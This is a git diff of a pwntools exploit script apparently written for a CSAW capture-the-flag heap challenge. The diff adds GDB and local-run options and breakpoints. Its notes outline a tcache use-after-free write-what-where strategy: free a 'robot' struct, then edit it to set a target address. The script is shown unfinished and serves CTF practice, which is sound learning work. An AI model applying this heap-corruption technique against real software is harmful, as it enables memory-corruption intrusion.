@@ -2,17 +2,24 @@
 
 from pwn import *
 
-if not(args.LOCAL):
-    conn = remote('pwn.red.csaw.io',5008)
-else:
+if args.GDB:
     conn = gdb.debug('./worstcodeever', gdbscript=(''
          +'break display\n'
          +'commands\n'
          +'heap bins\n'#unfortunately this shows up before gef context
          +'end\n'
+         +'break add_friend\n'
+         +'break add_friend\n'
+         +'break remove_friend\n'
+         +'break edit_friend\n'
          +'c\n'#start automatically
         )
     )
+elif args.LOCAL:
+    conn = process('./worstcodeever')
+else:
+    conn = remote('pwn.red.csaw.io',5008)
+
 
 """ Notes
 sizeof(struct Friend) == 16
@@ -20,6 +27,7 @@ sizeof(union identifier) == 8
 tcache is used when friends are freed
 
 Write-What-Where Strategy:
+-create an unwanted robot (to avoid "too few friends")
 -create a robot
 -free the robot
 -edit the robot, setting barcode to `where`
@@ -74,8 +82,8 @@ def display(index):
     conn.sendline(str(index).encode())
     print(conn.recv())
 
-addfriend()
-display(0)
+#addfriend('fixme', 100, 102)
+#display(0)
 
 conn.interactive()
 
